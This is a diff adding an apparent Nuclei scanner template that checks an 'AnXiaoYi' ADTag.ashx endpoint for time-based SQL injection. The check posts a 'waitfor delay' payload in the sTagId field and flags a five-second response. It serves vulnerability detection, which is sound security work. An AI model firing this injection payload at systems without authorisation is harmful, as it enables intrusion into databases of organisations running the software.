@@ -1,0 +1,27 @@
+id: AnXiaoYi-ADTag-sqlInjection
+
+info:
+  name: AnXiaoYi-ADTag-sqlInjection
+  author: iSee857
+  severity: high
+  description: AnXiaoYi-ADTag-sqlInjection
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /Module/BPCJ/AD_Tag/Controller/ADTag.ashx HTTP/1.1
+        Host: {{Host}}
+        Content-type:application/x-www-form-urlencoded
+
+        action=exportExcel&sTagId='waitfor+delay'0:0:5'--
+      
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
